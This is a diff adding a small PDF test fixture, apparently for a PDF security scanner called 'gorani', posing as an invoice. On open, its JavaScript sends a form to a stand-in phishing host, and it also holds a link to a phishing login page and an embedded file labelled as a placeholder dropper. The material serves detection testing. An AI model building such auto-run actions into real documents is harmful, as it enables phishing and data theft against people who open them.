@@ -1,0 +1,147 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<<
+/PageMode /UseNone
+/Pages 2 0 R
+/Type /Catalog
+/Names <<
+/JavaScript <<
+/Names [ (gorani\055fixture) 8 0 R ]
+>>
+/EmbeddedFiles 12 0 R
+>>
+/OpenAction <<
+/S /JavaScript
+/JS (app\056alert\050\047gorani\072 OpenAction ran\047\051\073 this\056submitForm\050\047https\072\057\057phish\056example\057collect\047\051\073)
+>>
+>>
+endobj
+2 0 obj
+<<
+/Count 1
+/Kids [ 3 0 R ]
+/Type /Pages
+>>
+endobj
+3 0 obj
+<<
+/Contents 4 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Parent 2 0 R
+/Resources <<
+/Font 5 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Annots [ 9 0 R ]
+>>
+endobj
+4 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 155
+>>
+stream
+GarW0_$YcZ(kh?A`HSBn[f7i2=XXQeotQ&p[=Pq$[_BIf660NC?p80l0U$&@[Y%'&*X&b3'e/_e4gEUTiHFtX7?LYY0$?\#W@NUEXH"Gmh`>4eccaM6d0I8Ydl3oug"uipcps7C"9%%MEW5adP)XOe.Y%~>
+endstream
+endobj
+5 0 obj
+<<
+/F1 6 0 R
+>>
+endobj
+6 0 obj
+<<
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+/Name /F1
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+7 0 obj
+<<
+/Author (anonymous)
+/CreationDate (D\07220000101000000\05300\04700\047)
+/Creator (gorani fixtures)
+/Keywords ()
+/ModDate (D\07220000101000000\05300\04700\047)
+/Producer (gorani fixtures)
+/Subject (unspecified)
+/Title (Invoice)
+/Trapped /False
+>>
+endobj
+8 0 obj
+<<
+/S /JavaScript
+/JS (app\056alert\050\047gorani\072 document JavaScript ran\047\051\073)
+>>
+endobj
+9 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [ 72 690 400 720 ]
+/Border [ 0 0 0 ]
+/A <<
+/S /URI
+/Type /Action
+/URI (https\072\057\057phish\056example\057login)
+>>
+/P 3 0 R
+>>
+endobj
+10 0 obj
+<<
+/Type /EmbeddedFile
+/Length 26
+>>
+stream
+pretend this is a dropper
+
+endstream
+endobj
+11 0 obj
+<<
+/Type /Filespec
+/F (payload\056txt)
+/EF <<
+/F 10 0 R
+>>
+>>
+endobj
+12 0 obj
+<<
+/Names [ (payload\056txt) 11 0 R ]
+>>
+endobj
+xref
+0 13
+0000000000 65535 f 
+0000000015 00000 n 
+0000000353 00000 n 
+0000000412 00000 n 
+0000000629 00000 n 
+0000000875 00000 n 
+0000000906 00000 n 
+0000001013 00000 n 
+0000001277 00000 n 
+0000001386 00000 n 
+0000001568 00000 n 
+0000001665 00000 n 
+0000001743 00000 n 
+trailer
+<<
+/Size 13
+/Root 1 0 R
+/Info 7 0 R
+/ID [ <676f72616e692d666978747572652d31> <676f72616e692d666978747572652d31> ]
+>>
+startxref
+1800
+%%EOF
